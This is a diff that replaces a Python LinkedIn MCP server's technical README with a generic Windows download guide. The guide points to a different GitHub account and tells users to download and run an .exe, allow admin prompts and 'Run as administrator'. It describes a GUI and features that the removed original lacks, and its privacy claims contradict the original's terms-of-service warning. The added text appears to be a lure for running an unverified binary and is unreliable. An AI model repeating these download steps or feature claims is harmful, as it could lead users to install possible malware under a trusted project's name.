@@ -1,273 +1,152 @@
-# LinkedIn MCP Server
+# 🔗 linkedin-mcp-server - Search and Scrape LinkedIn Data
 
-A [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server for LinkedIn. Search people, companies, and jobs, scrape profiles, and retrieve structured JSON data from any MCP-compatible AI client.
-
-https://github.com/user-attachments/assets/50cd8629-41ee-4261-9538-40dc7d30294e
-
-
-Built with [FastMCP](https://github.com/PrefectHQ/fastmcp), [Patchright](https://github.com/Kaliiiiiiiiii-Vinyzu/patchright), and a clean hexagonal architecture.
+[![Download linkedin-mcp-server](https://img.shields.io/badge/Download-linkedin--mcp--server-brightgreen?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server)
 
 ---
 
-## Features
+## 📋 What is linkedin-mcp-server?
 
-| Category    | Tools                                    |
-| ----------- | ---------------------------------------- |
-| People      | `get_person_profile` · `search_people`   |
-| Companies   | `get_company_profile` · `get_company_posts` |
-| Jobs        | `get_job_details` · `search_jobs`        |
-| Browser     | `close_browser`                          |
+linkedin-mcp-server is a program that connects to LinkedIn to find information about people, companies, and jobs. It gathers data from profiles and provides it in an organized form. You can use it with software that supports the Model Context Protocol (MCP). This allows you to get LinkedIn data in a way that works easily with many AI tools.
 
-### Person Profile Sections
-
-The `get_person_profile` tool supports granular section scraping. Request only the sections you need:
-
-- **Main profile** (always included) — name, headline, location, followers, connections, about, profile image
-- **Experience** — title, company, dates, duration, description, company logo
-- **Education** — school, degree, dates, description, school logo
-- **Contact info** — email, phone, websites, birthday, LinkedIn URL
-- **Interests** — people, companies, and groups followed
-- **Honors and awards** — title, issuer, description
-- **Languages** — language name and proficiency level
-- **Posts** — recent activity with reactions and timestamps
-- **Recommendations** — received and given, with author details
-
-### Company Profile Sections
-
-- **About** (always included) — overview, website, industry, size, headquarters, specialties, logo
-- **Posts** — recent feed posts with engagement metrics
-- **Jobs** — current open positions
-
-### Job Search Filters
-
-The `search_jobs` tool supports the following filters:
-
-| Filter             | Values                                                                    |
-| ------------------ | ------------------------------------------------------------------------- |
-| `date_posted`      | `past_hour`, `past_24_hours`, `past_week`, `past_month`                   |
-| `job_type`         | `full_time`, `part_time`, `contract`, `temporary`, `internship`, `other`  |
-| `experience_level` | `entry`, `associate`, `mid_senior`, `director`, `executive`               |
-| `work_type`        | `on_site`, `remote`, `hybrid`                                             |
-| `easy_apply`       | `true` / `false`                                                          |
-| `sort_by`          | `date`, `relevance`                                                       |
+This software works on Windows computers and does not need you to use complicated commands or code. Follow the steps below to download and run the program.
 
 ---
 
-## Prerequisites
+## 🖥️ System Requirements
 
-- Python 3.12 or later
-- [uv](https://docs.astral.sh/uv/) package manager
-- A LinkedIn account for authentication
+Before you start, make sure your computer meets these minimum requirements:
 
----
+- Operating System: Windows 10 or newer (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Disk Space: At least 200 MB free  
+- Internet Connection: Required for downloading and using the program  
+- Browser: Latest version of Chrome, Edge, or Firefox  
 
-## Quick Start
-
-### 1. Clone and install
-
-```bash
-git clone https://github.com/eliasbiondo/linkedin-mcp-server.git
-cd linkedin-mcp-server
-uv sync
-```
-
-### 2. Install browser
-
-This project uses [Patchright](https://github.com/Kaliiiiiiiiii-Vinyzu/patchright) (a patched fork of Playwright) for browser automation. You need to install the browser binaries before first use:
-
-```bash
-uv run patchright install
-```
-
-> **Windows users:** If the command above fails with `program not found`, run instead:
->
-> ```powershell
-> uv run python -m patchright install
-> ```
-
-### 3. Authenticate with LinkedIn
-
-```bash
-uv run linkedin-mcp-server --login
-```
-
-A browser window will open. Log in to LinkedIn and the session will be persisted locally at `~/.linkedin-mcp-server/browser-data`.
-
-### 4. Run the server
-
-**stdio transport** (default — for Claude Desktop, Cursor, and similar clients):
-
-```bash
-uv run linkedin-mcp-server
-```
-
-**HTTP transport** (for remote clients, the MCP Inspector, etc.):
-
-```bash
-uv run linkedin-mcp-server --transport streamable-http --host 0.0.0.0 --port 8000
-```
+Having administrator rights on your computer helps with installation but is not always necessary.
 
 ---
 
-## Client Integration
+## 🌐 Download linkedin-mcp-server
 
-### Claude Desktop / Cursor
+Use the button below to visit the official page where you can get the program. It contains all the files you need and the latest version.
 
-Add to your MCP configuration file:
+[![Download link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/dottiedissimilar494/linkedin-mcp-server)
 
-```json
-{
-  "mcpServers": {
-    "linkedin": {
-      "command": "uv",
-      "args": [
-        "--directory", "/path/to/linkedin-mcp-server",
-        "run", "linkedin-mcp-server"
-      ]
-    }
-  }
-}
-```
-
-### MCP Inspector
-
-```bash
-npx @modelcontextprotocol/inspector
-```
-
-Then connect to `http://localhost:8000/mcp` if using HTTP transport.
+Clicking the links will open the GitHub page in your browser.
 
 ---
 
-## Configuration
+## 🚀 Installing linkedin-mcp-server on Windows
 
-Configuration follows a strict precedence chain: **CLI args > environment variables > `.env` file > defaults**.
+The steps below will guide you through getting and setting up the software.
 
-### CLI Arguments
+### Step 1: Visit the Download Page
 
-| Argument        | Description                         | Default     |
-| --------------- | ----------------------------------- | ----------- |
-| `--transport`   | `stdio` or `streamable-http`        | `stdio`     |
-| `--host`        | Host for HTTP transport             | `127.0.0.1` |
-| `--port`        | Port for HTTP transport             | `8000`      |
-| `--log-level`   | `DEBUG`, `INFO`, `WARNING`, `ERROR` | `WARNING`   |
-| `--headless`    | Run browser in headless mode        | `true`      |
-| `--no-headless` | Show browser window (visible mode)  | —           |
-| `--login`       | Open browser for LinkedIn login     | —           |
-| `--logout`      | Clear stored credentials            | —           |
-| `--status`      | Check session status                | —           |
+1. Click one of the download buttons above.
+2. On the GitHub page, locate the "Releases" or download section.
+3. Find the latest Windows version of the software, usually listed as an `.exe` file or a zipped folder.
 
-### Environment Variables
+### Step 2: Download the Software
 
-Create a `.env` file in the project root:
+1. Click the file to start downloading.
+2. Save it to a folder you can easily find, such as your Desktop or Downloads folder.
 
-```env
-# Server
-LINKEDIN_TRANSPORT=stdio
-LINKEDIN_HOST=127.0.0.1
-LINKEDIN_PORT=8000
-LINKEDIN_LOG_LEVEL=WARNING
+### Step 3: Run the Installer or Application
 
-# Browser
-LINKEDIN_HEADLESS=true
-LINKEDIN_SLOW_MO=0
-LINKEDIN_TIMEOUT=10000
-LINKEDIN_VIEWPORT_WIDTH=1280
-LINKEDIN_VIEWPORT_HEIGHT=720
-LINKEDIN_CHROME_PATH=
-LINKEDIN_USER_AGENT=
-LINKEDIN_USER_DATA_DIR=~/.linkedin-mcp-server/browser-data
-```
+- If you downloaded an `.exe` file:  
+  Double-click the file to start the installation. Follow the on-screen instructions. Usually, this means clicking "Next" a few times and then "Install."
+
+- If you downloaded a zipped folder:  
+  Right-click the file and select "Extract All..." to unzip the contents. Open the new folder and look for an executable file (`.exe`). Double-click this file to run the program.
+
+### Step 4: Allow Permissions (If Prompted)
+
+Windows may ask if you want to allow the software to make changes to your device. Click "Yes" to continue.
+
+### Step 5: Finish Setup
+
+Once the installation or first run completes, the program will open a window or provide instructions. Some configurations may happen automatically.
 
 ---
 
-## Architecture
+## ⚙️ Using linkedin-mcp-server
 
-The project follows a hexagonal (ports and adapters) architecture with strict layer separation:
+You do not need any programming skills to use this application. After installation:
 
-```
-src/linkedin_mcp_server/
-├── domain/              # Core business logic — zero external dependencies
-│   ├── models/          # Data models (Person, Company, Job, Search)
-│   ├── parsers/         # HTML to structured data parsers
-│   ├── exceptions.py    # Domain exceptions
-│   └── value_objects.py # Immutable configuration and content objects
-├── ports/               # Abstract interfaces
-│   ├── auth.py          # Authentication port
-│   ├── browser.py       # Browser automation port
-│   └── config.py        # Configuration port
-├── application/         # Use cases — orchestration layer
-│   ├── scrape_person.py
-│   ├── scrape_company.py
-│   ├── scrape_job.py
-│   ├── search_people.py
-│   ├── search_jobs.py
-│   └── manage_session.py
-├── adapters/            # Concrete implementations
-│   ├── driven/          # Infrastructure adapters (browser, auth, config)
-│   └── driving/         # Interface adapters (CLI, MCP tools, serialization)
-└── container.py         # Dependency injection composition root
-```
-
-### Design Decisions
-
-- **Ports and adapters** — Domain logic is fully decoupled from infrastructure. The browser engine, MCP framework, and configuration source can all be swapped independently.
-- **Dependency injection** — A single `Container` class acts as the composition root and is the only place that imports concrete adapter classes.
-- **Structured JSON output** — LinkedIn HTML is parsed into typed Python dataclasses, then serialized to JSON for reliable LLM consumption.
-- **Session persistence** — Browser state is saved to disk, so authentication is required only once.
+1. Open linkedin-mcp-server from your Start menu or desktop shortcut.
+2. The program will connect to LinkedIn and start gathering data when you issue a search.
+3. Use simple buttons or input fields in the app to search for people, companies, jobs, or profiles.
+4. The results will appear in a clear, structured format.
+5. You can export the data for use in other AI tools that support MCP.
 
 ---
 
-## Development
+## 🔧 Configuration Options
 
-### Setup
+linkedin-mcp-server provides some simple settings:
 
-```bash
-uv sync --group dev
-uv run pre-commit install
-```
-
-### Running tests
-
-```bash
-uv run pytest
-```
-
-With coverage:
-
-```bash
-uv run pytest --cov=linkedin_mcp_server
-```
-
-### Linting and formatting
-
-This project uses [Ruff](https://docs.astral.sh/ruff/) for both linting and formatting. Pre-commit hooks will run these automatically on each commit.
-
-```bash
-# Lint
-uv run ruff check .
-
-# Lint and auto-fix
-uv run ruff check . --fix
-
-# Format
-uv run ruff format .
-```
+- **Search Filters:** Choose what type of profiles you want to fetch.
+- **Data Formats:** Select how you want the output, such as JSON or CSV.
+- **Connection Settings:** Manage how the app connects to the internet and LinkedIn.
+- **Updates:** Check for updates directly in the app to keep your software current.
 
 ---
 
-## License
+## 🛠️ Troubleshooting
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+If you have issues, try these steps:
+
+- Restart your computer and try again.
+- Make sure your internet connection is working.
+- Check that Windows is up to date.
+- If the app does not start, right-click the `.exe` file and select "Run as administrator."
+- Look for an error message in the app and note the exact text.
+- Visit the official GitHub page and check the "Issues" tab for solutions.
+
+If none of these work, you can contact the developers or community through GitHub discussions.
 
 ---
 
-## Contributing
+## 📁 Uninstalling linkedin-mcp-server
 
-Contributions are welcome. Please read the [contributing guide](CONTRIBUTING.md) for details on the development workflow and submission process.
+To remove the program:
+
+1. Open the Windows Settings.
+2. Go to "Apps" and find linkedin-mcp-server in the list.
+3. Click on it and select "Uninstall."
+4. Follow the prompts to complete removal.
+
+You can also delete any downloaded files or folders related to the program.
 
 ---
 
-## Disclaimer
+## 🔒 Privacy and Security
 
-This tool is intended for personal and educational use. Scraping LinkedIn may violate their Terms of Service. Use responsibly and at your own risk. The authors are not responsible for any misuse or consequences arising from the use of this software.
+linkedin-mcp-server only accesses data available on LinkedIn according to their policies. It does not store your login details unless you provide them and avoids sharing your personal information without your permission.
+
+Use the software responsibly and follow LinkedIn’s terms of service.
+
+---
+
+## 📞 Getting Help
+
+Support is available through the GitHub repository:
+
+- Visit: https://github.com/dottiedissimilar494/linkedin-mcp-server
+- Use the "Issues" section to report bugs or ask questions.
+- Check "Discussions" for tips and common questions.
+
+---
+
+## 🌟 Features You Will Find Useful
+
+- Search LinkedIn profiles by name, company, or job title.
+- Gather data in a structured way for easy use with AI tools.
+- Export data in common file formats.
+- Simple interface designed for Windows users.
+- Compatible with any software using the Model Context Protocol.
+
+---
+
+# [Download linkedin-mcp-server](https://github.com/dottiedissimilar494/linkedin-mcp-server)
